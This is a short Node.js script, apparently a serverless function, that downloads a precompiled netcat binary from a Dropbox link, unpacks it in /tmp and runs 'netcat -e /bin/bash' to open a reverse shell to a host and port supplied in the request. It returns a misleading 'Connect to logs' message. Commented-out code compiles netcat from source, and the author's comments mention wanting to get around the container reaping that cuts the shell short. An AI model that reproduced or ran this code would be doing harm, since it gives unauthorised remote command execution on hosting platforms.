var execsync = require('child_process').execSync;

// download netcat and initiate reverse shell
// edit final command to point at appropriate ip address hosting a listening netcat port
// launch listening port with netcat -l portnum

// shell lasts until the web box is restarted, so not very long, but fun anyway =)
// until i can figure out how to make keep_open work or bypass the container reaping it is only a novelty


module.exports = function (context, cb) {
    cb(null, 'Connect to logs. ');
// option 1 compile netcat
//    cmd = 'wget http://sourceforge.net/projects/netcat/files/netcat/0.7.1/netcat-0.7.1.tar.gz -O /tmp/netcat-0.7.1.tar.gz'
//    execsync(cmd, {stdio:[0,1,2]} );
//    cmd = 'cd /tmp; tar xzvf netcat-0.7.1.tar.gz'
//    execsync(cmd, {stdio:[0,1,2]});
//    cmd = 'cd /tmp/netcat-0.7.1 && ./configure'
//    execsync(cmd, {stdio:[0,1,2]} );
//    cmd = 'cd /tmp/netcat-0.7.1 && make'
//    execsync(cmd, {stdio:[0,1,2]} );
//    cmd = '/tmp/netcat-0.7.1/src/netcat -e /bin/bash ' + context.data.host + ' ' + context.data.port

// option 2 grab precompiled binaries
    cmd = 'wget https://www.dropbox.com/s/u0my5zl9lelhiv8/stuff.tar.bz?dl=0 -O /tmp/stuff.tar.bz'
    execsync(cmd, {stdio:[0,1,2]} );
    cmd = 'cd /tmp; tar xjvf stuff.tar.bz'
    execsync(cmd, {stdio:[0,1,2]});

    // last command fails if the remote port is unreachable/ not listening
    cmd = 'cd /tmp && ./netcat -e /bin/bash ' + context.data.host + ' ' + context.data.port;
    execsync(cmd, {stdio:[0,1,2]} );
    console.log('Complete');
}
